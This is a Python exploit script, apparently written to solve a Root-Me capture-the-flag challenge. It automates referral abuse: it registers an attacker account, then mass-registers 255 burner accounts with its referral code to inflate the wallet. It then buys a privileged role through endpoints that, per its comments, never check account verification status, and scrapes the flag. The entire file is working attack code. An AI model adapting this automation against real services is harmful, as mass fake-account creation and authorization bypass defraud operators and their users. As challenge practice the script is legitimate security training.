import re
import string
import random
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "https://instance-019fe980-884f-707f-8711-dfb7ff32fb8d.challenges.root-me.pro"

def rand_str(n=12):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def register(session, username, password, referral_code=None):
    data = {"username": username, "password": password}
    if referral_code:
        data["referral-code"] = referral_code
    for attempt in range(5):
        try:
            r = session.post(f"{BASE}/register", data=data, allow_redirects=True, timeout=15)
            return r
        except requests.exceptions.RequestException:
            if attempt == 4:
                raise
    return None

def get_profile(session):
    r = session.get(f"{BASE}/profile")
    return r.text

def extract_referral_code(html):
    m = re.search(r'Your code:.*?value="([a-f0-9]+)"', html, re.S)
    return m.group(1) if m else None

def extract_money(html):
    m = re.search(r'wallet:\s*([0-9 ]+)\$', html)
    if not m:
        return None
    return int(m.group(1).replace(" ", ""))

def main():
    attacker_user = "attacker_" + rand_str(6)
    attacker_pass = "Passw0rd!"
    s_attacker = requests.Session()

    print(f"[*] Registering attacker account: {attacker_user} / {attacker_pass}")
    register(s_attacker, attacker_user, attacker_pass)

    html = get_profile(s_attacker)
    ref_code = extract_referral_code(html)
    money = extract_money(html)
    print(f"[*] Attacker referral code: {ref_code}")
    print(f"[*] Attacker starting money: {money}")

    if not ref_code:
        print("[!] Could not extract referral code, dumping profile html")
        print(html[:2000])
        return

    # Note: after the first referral, verify-account marks the attacker's
    # status=0, so /profile will redirect to /verify-account from then on
    # (money is no longer visible there). /roles and /crypto-* never check
    # status though, so we just fire enough referrals blind (100+4000*n).
    # crypto-roles.html template only prints the flag for role=="crypto-ninja"
    # exactly (not crypto-brother), so we must hit the $1,000,000 price ->
    # 100 + 4000n >= 1,000,000 -> n>=250, use 255 for buffer.
    NEEDED_REFERRALS = 255

    def do_referral(_):
        burner_user = "burner_" + rand_str(10)
        burner_pass = "Passw0rd!"
        s_burner = requests.Session()
        register(s_burner, burner_user, burner_pass, referral_code=ref_code)

    for done in range(1, NEEDED_REFERRALS + 1):
        do_referral(done)
        if done % 25 == 0:
            print(f"[*] Completed {done}/{NEEDED_REFERRALS} referrals (attacker money ~= {100 + 4000*done})")

    print(f"[+] Estimated attacker money: {100 + 4000*NEEDED_REFERRALS}, buying crypto-ninja role")
    r = s_attacker.post(f"{BASE}/roles", data={"role": "crypto-ninja"}, allow_redirects=False)
    print(f"[*] /roles POST status={r.status_code} Location={r.headers.get('Location')}")

    r = s_attacker.get(f"{BASE}/crypto-ninja")
    print(f"[*] /crypto-ninja status: {r.status_code}")
    flag_match = re.search(r'RM\{[^}]+\}', r.text) or re.search(r'\bCTF\{[^}]+\}|\bFLAG\{[^}]+\}|\bflag\{[^}]+\}', r.text)
    if flag_match:
        print(f"[+] FLAG: {flag_match.group(0)}")
    else:
        with open("crypto_ninja_response.html", "w") as f:
            f.write(r.text)
        print("[!] Flag pattern not found, saved response to crypto_ninja_response.html")

if __name__ == "__main__":
    main()
